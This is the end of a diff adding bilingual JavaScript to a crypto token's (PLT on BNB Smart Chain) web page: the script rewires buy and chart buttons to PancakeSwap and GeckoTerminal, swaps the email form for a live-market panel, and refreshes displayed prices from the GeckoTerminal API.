+            statusMsg.innerText = isEnglish ? "PLT added successfully!" : "PLT aggiunto con successo!";
+        }
+    } catch (error) {
+        console.error("Errore importazione:", error);
+        statusMsg.style.color = "red";
+        statusMsg.innerText = isEnglish 
+            ? "Auto-import blocked by this wallet. Please copy the contract from the backup file." 
+            : "Importazione automatica bloccata da questo wallet. Copia il contratto dal file di backup.";
+    }
+}
+
+
+</script>
+
+
+<script>(function(){const T="0xF34c49593E7a67Ec34CADADb5c34e0b24d1d3ac8",P="0xa51e99928c39ae656b7cb38006b8a1d220479b2c",U="0x55d398326f99059fF775485246999027B3197955",SW="https://pancakeswap.finance/swap?inputCurrency="+U+"&outputCurrency="+T,CH="https://www.geckoterminal.com/api/v2/networks/bsc/pools/"+P,PL="https://pinksale.finance/pinklock/bsc/record/2113264";function isIta(){return document.body.innerText.includes("FORNITURA MASSIMA")||document.body.innerText.includes("Acquista PLT");}function renderBox(bx){const it=isIta();const title=it?"MERCATO LIVE ATTIVO - PLT / USDT SU PANCAKESWAP":"LIVE MARKET ACTIVE - PLT / USDT ON PANCAKESWAP";const desc=it?"Pool di liquidità attiva su BNB Smart Chain con 0% tasse e blocco PinkLock di 365 giorni.":"Liquidity pool is live on BNB Smart Chain with 0% tax and 365-day PinkLock protection.";const b1=it?"Scambia PLT / USDT ↗":"Trade PLT / USDT ↗";const b2=it?"Prova Blocco LP 1 Anno 🔒":"1-Year LP Lock Proof 🔒";bx.innerHTML='<div style="text-align:center;padding:8px 4px;"><div style="color:#10b981;font-weight:700;font-size:1rem;letter-spacing:0.5px;margin-bottom:6px;">'+title+'</div><div style="font-size:0.88rem;color:#94a3b8;margin-bottom:16px;">'+desc+'</div><div style="display:flex;gap:12px;justify-content:center;align-items:center;flex-wrap:wrap;"><a href="'+SW+'" target="_blank" style="display:inline-flex;align-items:center;justify-content:center;background:#10b981;color:#020617;font-weight:700;font-size:0.9rem;padding:10px 20px;border-radius:8px;text-decoration:none;border:1px solid #10b981;">'+b1+'</a><a href="'+PL+'" target="_blank" style="display:inline-flex;align-items:center;justify-content:center;background:#1e293b;color:#facc15;font-weight:600;font-size:0.9rem;padding:10px 20px;border-radius:8px;text-decoration:none;border:1px solid rgba(250,204,21,0.45);">'+b2+'</a></div></div>';}function initLiveUI(){document.querySelectorAll("a,button").forEach(b=>{const t=b.textContent.trim();if(t.includes("Buy PLT")||t.includes("Acquista PLT")){if(b.tagName==="A"){b.href=SW;b.target="_blank";}else{b.onclick=function(ev){ev.preventDefault();window.open(SW,"_blank");};}}if(t.includes("Live Chart")||t.includes("Grafico")){if(b.tagName==="A"){b.href=CH;b.target="_blank";}else{b.onclick=function(ev){ev.preventDefault();window.open(CH,"_blank");};}}});const inp=document.querySelector("input[type=email],input[placeholder*=email]");if(inp&&inp.parentElement&&inp.parentElement.parentElement){const bx=inp.parentElement.parentElement;bx.id="live-market-box";renderBox(bx);}else{const bx=document.getElementById("live-market-box");if(bx)renderBox(bx);}}async function sync(){try{const r=await fetch("https://api.geckoterminal.com/api/v2/networks/bsc/pools/"+P,{headers:{"Accept":"application/json"}});const j=await r.json();const attr=j&&j.data&&j.data.attributes;if(!attr)return;const pr=parseFloat(attr.base_token_price_usd)||parseFloat(attr.quote_token_price_usd);const c24=attr.price_change_percentage&&attr.price_change_percentage.h24!==undefined?parseFloat(attr.price_change_percentage.h24):null;if(isNaN(pr))return;document.querySelectorAll("*").forEach(e=>{if(e.children.length===0&&e.textContent.trim().startsWith("$")&&!isNaN(parseFloat(e.textContent.trim().slice(1)))){e.textContent="$"+(pr<0.01?pr.toFixed(6):pr.toFixed(4));if(e.nextElementSibling)e.nextElementSibling.textContent=(isIta()?"Prezzo Live PancakeSwap":"Live PancakeSwap Price")+(c24!==null?" ("+(c24>=0?"+":"")+c24.toFixed(2)+"% 24h)":"");if(e.previousElementSibling)e.previousElementSibling.textContent=isIta()?"PREZZO LIVE DI MERCATO":"LIVE MARKET PRICE";}});}catch(e){}}initLiveUI();sync();setInterval(sync,15000);setInterval(initLiveUI,800);})();</script>
+<script src="https://www.freshcoins.io/widget.js"></script>
+</body>
+</html>
